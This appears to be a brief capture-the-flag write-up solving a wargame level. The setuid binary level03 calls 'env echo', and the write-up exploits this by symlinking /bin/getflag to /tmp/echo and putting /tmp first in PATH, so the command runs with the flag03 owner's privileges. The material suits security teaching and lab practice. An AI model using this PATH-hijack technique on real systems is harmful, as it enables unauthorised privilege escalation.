#./level03 => exploit me

#level03 contains /usr/bin/env echo Exploit me

#the rights to the file are rwsr-sr-x and its author is flag03, the user who gives access to the flag, so we want to gain flag03 rights by using this file to run getflag
#but we cannot edit this file

ln -s /bin/getflag /tmp/echo

export PATH=/tmp:$PATH
./level03